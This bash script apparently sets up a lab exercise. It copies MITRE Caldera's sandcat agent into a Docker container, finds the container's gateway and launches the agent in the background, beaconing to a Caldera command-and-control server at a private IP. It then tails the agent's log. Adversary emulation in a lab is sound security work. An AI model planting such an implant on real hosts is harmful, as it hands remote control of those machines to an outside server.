#!/bin/bash
echo "=== copy sandcat into host1 ==="
docker cp /opt/caldera/plugins/sandcat/payloads/sandcat.go-linux asc-asscor-host1:/tmp/sandcat
docker exec asc-asscor-host1 chmod 755 /tmp/sandcat
echo "=== host1 can reach caldera? (WSL IP from container) ==="
# Caldera runs on WSL host; containers reach it via default gw on clab net
# Get caldera's reachable IP: it listens 0.0.0.0:8888, containers use host gateway
GW=$(docker exec asc-asscor-host1 ip route | grep default | awk '{print $3}')
echo "container default gw: $GW"
echo "=== try launching sandcat pointing at caldera on WSL host ==="
# WSL2 host is reachable from containers via the docker bridge gateway or clab net
# The clab containers can reach the WSL host IP via eth0's gateway
docker exec -d asc-asscor-host1 bash -c "/tmp/sandcat --server http://172.31.9.226:8888 --v 2>&1 | tee /tmp/sandcat.log"
sleep 8
echo "=== sandcat log in host1 ==="
docker exec asc-asscor-host1 tail -15 /tmp/sandcat.log 2>&1 | head -18
echo DONE
